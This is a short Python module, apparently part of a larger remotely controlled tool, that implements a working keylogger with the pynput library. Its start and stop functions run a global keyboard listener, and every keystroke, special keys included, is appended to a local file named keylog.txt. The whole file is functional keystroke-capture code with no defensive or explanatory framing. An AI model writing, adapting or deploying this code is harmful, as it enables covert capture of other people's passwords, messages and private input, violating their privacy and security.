from pynput import keyboard
import threading
import os

is_logging = False
log_file = "keylog.txt"
listener = None

def on_press(key):
    global is_logging
    if not is_logging:
        return False # Stop listener

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            try:
                k = key.char
            except:
                k = f"[{key.name}]"
            
            if k == None:
                 k = f"[{str(key)}]"

            f.write(str(k))
    except Exception as e:
        print(f"Keylog error: {e}")

def start_logging():
    global is_logging, listener
    if is_logging:
        return "Keylogger is already running."
    
    is_logging = True
    # Clear old log or append? Usually append is safer, but let's start fresh or append.
    # Let's append.
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return "Keylogger started."

def stop_logging():
    global is_logging, listener
    if not is_logging:
        return "Keylogger is not running."
    
    is_logging = False
    if listener:
        listener.stop()
        listener = None
    return "Keylogger stopped."
